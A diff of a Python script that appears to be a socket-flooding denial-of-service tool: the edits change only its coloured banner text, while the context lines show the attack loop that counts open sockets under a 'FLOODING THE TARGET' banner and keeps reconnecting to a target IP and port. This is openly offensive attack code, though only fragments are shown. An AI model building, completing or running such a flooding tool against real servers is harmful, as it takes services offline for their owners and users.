@@ -77,7 +77,7 @@ def main():
     bar.finish()
 
     while True:
-        print("\033[32m▒▒ ▒▒ ▒▒ ▒▒  \033[96m▒▒ ▒▒ ▒▒ ▒▒ ▒▒\033[36m▒▒ ▒▒ ▒▒ ▒▒ \033[0m")
+        print("\033[3m▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ \033[30m▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ \033[94m▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ \033[0m")
         print(("\033[32m [÷]▒▒\033[92m▒▒BUILD ▒▒ ATTACK▒▒ \033[33mFLOODING▒▒ THE▒▒TARGET▒▒ {}".format(len(socket_list))))
 
         for s in socket_list:
@@ -87,7 +87,7 @@ def main():
                 socket_list.remove(s)
 
         for _ in range(socket_count - len(socket_list)):
-            print(("\033[33m {}     Connenting the Web...".format("\n")))
+            print(("\033[33m {} ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ Connenting the Web ▒▒ ▒▒ ▒▒ ▒▒ ▒▒ ▒▒".format("\n")))
             try:
                 s=init_socket(ip,port)
                 if s:
